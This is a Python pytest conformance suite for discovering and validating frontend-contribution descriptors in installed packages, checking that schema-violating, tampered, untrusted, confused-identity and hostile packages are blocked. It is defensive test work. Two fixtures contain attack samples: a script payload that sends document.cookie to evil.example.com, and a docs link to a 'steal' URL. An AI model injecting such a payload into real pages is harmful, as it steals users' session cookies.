"""GOC-24 TCK: FrontendContribution.v1 discovery, schema, and hostile-input tests.

Every fixture package here is a REAL, on-disk installed distribution (a
``.dist-info`` directory with ``METADATA``/``RECORD``/``entry_points.txt``,
plus the module directory it owns) added to ``sys.path`` for the duration of
the test. ``discover_frontend_contributions`` is exercised through the real
``importlib.metadata.entry_points()`` call -- nothing about the discovery
seam itself is mocked, only the *input* (a genuine installed package is
built instead of one actually published to a package index), matching this
repo's Wire-First rule against mocking the seam under test.

Coverage mirrors the lane's TCK case classes: a conforming package PASSES
end to end (proves zero-core-edit discovery is real), and a battery of
non-conforming packages each fail for the SPECIFIC reason under test (schema
violation, missing capability declaration, tampered digest, untrusted
signer, unsafe/executable content, package-identity confusion) -- proving
the TCK actually catches bad input rather than rubber-stamping everything.
"""

from __future__ import annotations

import base64
import hashlib
import importlib
import importlib.metadata
import json
import sys
from pathlib import Path

import pytest

from agent_utilities.core import frontend_providers as fp

TRUSTED_SIGNER = "fleet-release-2026-08"


def _b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _conforming_payload(package_id: str) -> dict:
    payload = {
        "schema_version": "frontend-contribution.v1",
        "package_id": package_id,
        "package_version": "1.4.0",
        "descriptor_version": 1,
        "descriptor_digest": "",
        "title": "GitLab",
        "icon": "gitlab",
        "nav": {"section": "integrations", "order": 40},
        "required_scopes": ["gitlab.read"],
        "read_models": [
            {
                "id": "health",
                "schema": "Health.v1",
                "capability": "gitlab.health.check",
                "renderer": "metric-cards",
            },
            {
                "id": "merge_requests",
                "schema": "ChangeRequest.v1",
                "capability": "gitlab.merge_requests.list",
                "renderer": "data-table",
                "refresh": {"mode": "event", "fallback_seconds": 60},
                "columns": ["project", "iid", "title", "author"],
            },
        ],
        "actions": [
            {
                "id": "review",
                "capability": "gitlab.merge_request.review",
                "placement": "row",
                "confirm": "preflight",
                "approval_class": "change",
            }
        ],
        "panels": [{"id": "health", "renderer": "metric-cards"}],
        "realtime_topics": ["gitlab.merge_request.changed"],
        "empty_state": "No merge requests are visible to this identity.",
        "docs_ref": f"pkg:{package_id}/operator",
        "provenance": {
            "source": "package-entry-point",
            "signer_key_id": TRUSTED_SIGNER,
            "artifact_digest": "sha256:" + ("ab" * 32),
        },
        "extensions": {},
    }
    payload["descriptor_digest"] = fp.compute_descriptor_digest(payload)
    return payload


def _install_fixture_package(
    tmp_path: Path,
    *,
    provider_name: str,
    module: str,
    payload_bytes: bytes,
    dist_name: str | None = None,
    version: str = "1.0.0",
) -> Path:
    """Build a genuine on-disk installed package and return its site root."""

    dist_name = dist_name or provider_name
    site_root = tmp_path / f"site-{provider_name}"
    module_dir = site_root
    for part in module.split("."):
        module_dir = module_dir / part
    module_dir.mkdir(parents=True)
    descriptor_path = module_dir / fp.DESCRIPTOR_FILENAME
    descriptor_path.write_bytes(payload_bytes)

    dist_info = site_root / f"{dist_name.replace('-', '_')}-{version}.dist-info"
    dist_info.mkdir()
    (dist_info / "METADATA").write_text(
        f"Metadata-Version: 2.1\nName: {dist_name}\nVersion: {version}\n",
        encoding="utf-8",
    )
    (dist_info / "entry_points.txt").write_text(
        f"[{fp.FRONTEND_PROVIDER_GROUP}]\n{provider_name} = {module}\n",
        encoding="utf-8",
    )
    module_rel = "/".join(module.split(".")) + "/" + fp.DESCRIPTOR_FILENAME
    digest_hash = _b64(hashlib.sha256(payload_bytes).digest())
    (dist_info / "RECORD").write_text(
        f"{module_rel},sha256={digest_hash},{len(payload_bytes)}\n"
        f"{dist_info.name}/METADATA,,\n"
        f"{dist_info.name}/RECORD,,\n",
        encoding="utf-8",
    )
    return site_root


@pytest.fixture
def sys_path_sandbox(monkeypatch):
    """Adds/removes fake site roots from sys.path, invalidating import caches."""

    added: list[str] = []

    def _add(path: Path) -> None:
        entry = str(path)
        sys.path.insert(0, entry)
        added.append(entry)
        importlib.invalidate_caches()

    yield _add

    for entry in added:
        if entry in sys.path:
            sys.path.remove(entry)
    importlib.invalidate_caches()
    importlib.metadata.MetadataPathFinder.invalidate_caches()


def _discover(package_id: str) -> fp.FrontendContributionRecord:
    records = fp.discover_frontend_contributions(
        trusted_signers=frozenset({TRUSTED_SIGNER})
    )
    matches = [r for r in records if r.provider_name == package_id]
    assert matches, (
        f"no discovery record for {package_id!r} (got {[r.provider_name for r in records]})"
    )
    return matches[0]


class TestConformingPackage:
    """A well-formed descriptor discovers OK end to end -- no core edit needed."""

    def test_conforming_package_passes(self, tmp_path, sys_path_sandbox):
        payload = _conforming_payload("fixture-good")
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-good",
            module="fixture_good.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-good")

        assert record.status == "OK", record.reason
        assert record.reason is None
        assert record.descriptor is not None
        assert record.descriptor.title == "GitLab"
        assert record.descriptor_digest == payload["descriptor_digest"]
        # Zero-core-edit discovery proof: this package was never named in
        # frontend_providers.py, providers.py, or any allowlist -- only its
        # own installed entry point made it appear.
        assert "fixture-good" not in Path(fp.__file__).read_text(encoding="utf-8")

    def test_capability_cross_check_degrades_not_blocks(
        self, tmp_path, sys_path_sandbox
    ):
        payload = _conforming_payload("fixture-degraded")
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-degraded",
            module="fixture_degraded.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        records = fp.discover_frontend_contributions(
            trusted_signers=frozenset({TRUSTED_SIGNER}),
            capability_exists=lambda cap: cap == "gitlab.health.check",
        )
        record = next(r for r in records if r.provider_name == "fixture-degraded")
        assert record.status == "DEGRADED"
        assert record.reason is not None and "capability_unresolved" in record.reason
        assert "gitlab.merge_requests.list" in record.reason


class TestHostileInputsAreCaught:
    """Every non-conforming vector must resolve to BLOCKED with a distinct reason."""

    def test_missing_descriptor_file_is_blocked_not_silently_skipped(
        self, tmp_path, sys_path_sandbox
    ):
        site_root = tmp_path / "site-empty"
        module_dir = site_root / "fixture_empty" / "frontend"
        module_dir.mkdir(parents=True)
        (module_dir / "README.md").write_text("not a descriptor", encoding="utf-8")
        dist_info = site_root / "fixture_empty-1.0.0.dist-info"
        dist_info.mkdir()
        (dist_info / "METADATA").write_text(
            "Metadata-Version: 2.1\nName: fixture-empty\nVersion: 1.0.0\n",
            encoding="utf-8",
        )
        (dist_info / "entry_points.txt").write_text(
            f"[{fp.FRONTEND_PROVIDER_GROUP}]\nfixture-empty = fixture_empty.frontend\n",
            encoding="utf-8",
        )
        (dist_info / "RECORD").write_text(
            "fixture_empty/frontend/README.md,,\n", encoding="utf-8"
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-empty")
        assert record.status == "BLOCKED"
        assert record.reason == "descriptor_file_missing_or_ambiguous"

    def test_unknown_field_is_rejected(self, tmp_path, sys_path_sandbox):
        payload = _conforming_payload("fixture-unknown-field")
        payload["totally_made_up_field"] = "smuggled"
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-unknown-field",
            module="fixture_unknown_field.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-unknown-field")
        assert record.status == "BLOCKED"
        assert record.reason is not None and record.reason.startswith(
            "schema_violation"
        )

    def test_missing_required_read_model_is_rejected(self, tmp_path, sys_path_sandbox):
        payload = _conforming_payload("fixture-no-health")
        payload["read_models"] = [
            payload["read_models"][1]
        ]  # drop the health/inventory model
        payload["descriptor_digest"] = fp.compute_descriptor_digest(payload)
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-no-health",
            module="fixture_no_health.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-no-health")
        assert record.status == "BLOCKED"
        assert record.reason is not None and record.reason.startswith(
            "schema_violation"
        )

    def test_mutating_action_without_confirm_is_rejected(
        self, tmp_path, sys_path_sandbox
    ):
        payload = _conforming_payload("fixture-bad-action")
        payload["actions"][0]["confirm"] = "yolo"
        payload["descriptor_digest"] = fp.compute_descriptor_digest(payload)
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-bad-action",
            module="fixture_bad_action.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-bad-action")
        assert record.status == "BLOCKED"
        assert record.reason is not None and record.reason.startswith(
            "schema_violation"
        )

    def test_tampered_descriptor_fails_digest_check(self, tmp_path, sys_path_sandbox):
        payload = _conforming_payload("fixture-tampered")
        # Tamper AFTER computing the honest digest -- simulates a supply-chain
        # replay/edit that didn't re-sign, which the digest check must catch.
        payload["title"] = "GitLab (tampered)"
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-tampered",
            module="fixture_tampered.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-tampered")
        assert record.status == "BLOCKED"
        assert record.reason == "descriptor_digest_mismatch"

    def test_untrusted_signer_is_blocked(self, tmp_path, sys_path_sandbox):
        payload = _conforming_payload("fixture-untrusted-signer")
        payload["provenance"]["signer_key_id"] = "not-a-trusted-key"
        payload["descriptor_digest"] = fp.compute_descriptor_digest(payload)
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-untrusted-signer",
            module="fixture_untrusted_signer.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-untrusted-signer")
        assert record.status == "BLOCKED"
        assert record.reason == "signer_untrusted"

    def test_empty_trust_allowlist_fails_closed_even_for_a_valid_descriptor(
        self, tmp_path, sys_path_sandbox
    ):
        payload = _conforming_payload("fixture-fail-closed")
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-fail-closed",
            module="fixture_fail_closed.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        records = fp.discover_frontend_contributions()  # no trusted_signers configured
        record = next(r for r in records if r.provider_name == "fixture-fail-closed")
        assert record.status == "BLOCKED"
        assert record.reason == "signer_untrusted"

    def test_package_id_confusion_is_blocked(self, tmp_path, sys_path_sandbox):
        payload = _conforming_payload(
            "some-other-package"
        )  # claims a DIFFERENT identity
        payload["descriptor_digest"] = fp.compute_descriptor_digest(payload)
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-confused-identity",
            module="fixture_confused_identity.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-confused-identity")
        assert record.status == "BLOCKED"
        assert record.reason == "package_id_mismatch"
        assert record.package_id == "some-other-package"

    def test_fabricated_state_via_remote_docs_ref_is_rejected(
        self, tmp_path, sys_path_sandbox
    ):
        payload = _conforming_payload("fixture-remote-docs")
        payload["docs_ref"] = "https://evil.example.com/steal"
        payload["descriptor_digest"] = fp.compute_descriptor_digest(payload)
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-remote-docs",
            module="fixture_remote_docs.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-remote-docs")
        assert record.status == "BLOCKED"
        assert record.reason is not None and record.reason.startswith(
            "schema_violation"
        )

    def test_executable_content_is_rejected(self, tmp_path, sys_path_sandbox):
        payload = _conforming_payload("fixture-xss")
        payload["empty_state"] = (
            "<script>fetch('https://evil.example.com/'+document.cookie)</script>"
        )
        payload["descriptor_digest"] = fp.compute_descriptor_digest(payload)
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-xss",
            module="fixture_xss.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-xss")
        assert record.status == "BLOCKED"
        assert record.reason == "unsafe_content"

    def test_oversized_descriptor_is_rejected(self, tmp_path, sys_path_sandbox):
        payload = _conforming_payload("fixture-oversized")
        payload["extensions"] = {"blob": "x" * (fp.MAX_DESCRIPTOR_BYTES + 1)}
        payload["descriptor_digest"] = (
            ""  # digest is irrelevant; size bound trips first
        )
        raw = json.dumps(payload).encode("utf-8")
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-oversized",
            module="fixture_oversized.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-oversized")
        assert record.status == "BLOCKED"
        assert record.reason == "descriptor_oversized"

    def test_malformed_json_is_rejected(self, tmp_path, sys_path_sandbox):
        raw = b"{not valid json"
        site_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-badjson",
            module="fixture_badjson.frontend",
            payload_bytes=raw,
        )
        sys_path_sandbox(site_root)

        record = _discover("fixture-badjson")
        assert record.status == "BLOCKED"
        assert record.reason is not None and record.reason.startswith(
            "descriptor_invalid_json"
        )


class TestCatalogEpoch:
    def test_catalog_digest_is_stable_and_order_independent_of_input(self):
        records_a = fp.discover_frontend_contributions()
        records_b = fp.discover_frontend_contributions()
        assert fp.catalog_digest(records_a) == fp.catalog_digest(records_b)


class TestNoSilentSkip:
    def test_provider_enumeration_is_hard_bounded(self, monkeypatch):
        monkeypatch.setattr(
            fp,
            "provider_registrations",
            lambda _group: (None,) * (fp.MAX_FRONTEND_PROVIDERS + 1),
        )

        with pytest.raises(fp.ProviderRegistrationError, match="count exceeds"):
            fp.discover_frontend_contributions()

    def test_two_packages_one_bad_one_good_both_produce_a_visible_record(
        self, tmp_path, sys_path_sandbox
    ):
        good_payload = _conforming_payload("fixture-pair-good")
        good_raw = json.dumps(good_payload).encode("utf-8")
        good_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-pair-good",
            module="fixture_pair_good.frontend",
            payload_bytes=good_raw,
        )
        bad_raw = b"{not valid json"
        bad_root = _install_fixture_package(
            tmp_path,
            provider_name="fixture-pair-bad",
            module="fixture_pair_bad.frontend",
            payload_bytes=bad_raw,
        )
        sys_path_sandbox(good_root)
        sys_path_sandbox(bad_root)

        records = fp.discover_frontend_contributions(
            trusted_signers=frozenset({TRUSTED_SIGNER})
        )
        by_name = {r.provider_name: r for r in records}
        assert by_name["fixture-pair-good"].status == "OK"
        assert by_name["fixture-pair-bad"].status == "BLOCKED"
